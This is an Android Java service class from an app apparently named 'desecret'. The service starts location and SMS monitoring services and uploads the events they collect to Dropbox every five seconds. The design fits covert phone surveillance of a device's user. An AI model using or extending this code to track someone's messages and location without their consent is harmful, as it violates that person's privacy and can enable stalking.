package cc.mincai.android.desecret.service;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import cc.mincai.android.desecret.model.DropboxMessageTransport;
import cc.mincai.android.desecret.model.Event;
import cc.mincai.android.desecret.model.Message;
import cc.mincai.android.desecret.model.MessageTransport;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MasterService extends Service {
    private IBinder binder = new MyBinder();
    private boolean registered;
    private MessageTransport messageTransport;

    private List<Event> pendingEvents;

    private Timer timer = new Timer();

    @Override
    public IBinder onBind(Intent intent) {
        return this.binder;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Event event = (Event) intent.getExtras().getSerializable("event");
            if (event != null) {
                this.addEvent(event);
            }
        }

        return Service.START_STICKY;
    }

    @Override
    public void onCreate() {
        this.messageTransport = new DropboxMessageTransport(this);

        this.pendingEvents = new ArrayList<Event>();

        this.register();
    }

    @Override
    public void onDestroy() {
        this.deregister();
    }

    private void sendPendingMessages() {
        this.timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                for (Event event : pendingEvents) {
                    getMessageTransport().sendMessage(new Message(event));
                }

                pendingEvents.clear();
            }
        }, 0, UPDATE_INTERVAL);
    }

    private void register() {
        if (!this.registered) {
            this.messageTransport.open();
            this.sendPendingMessages();

            this.startService(new Intent(this, LocationMonitorService.class));
            this.startService(new Intent(this, SmsMonitorService.class));

            this.registered = true;
        }
    }

    private void deregister() {
        if (this.registered) {
            this.stopService(new Intent(this, LocationMonitorService.class));
            this.stopService(new Intent(this, SmsMonitorService.class));

            this.timer.cancel();
            this.messageTransport.close();

            this.registered = false;
        }
    }

    public void addEvent(Event event) {
        this.pendingEvents.add(event);
    }

    public MessageTransport getMessageTransport() {
        return this.messageTransport;
    }

    public class MyBinder extends Binder {
        public MasterService getService() {
            return MasterService.this;
        }
    }

    private static final long UPDATE_INTERVAL = 5000;
}
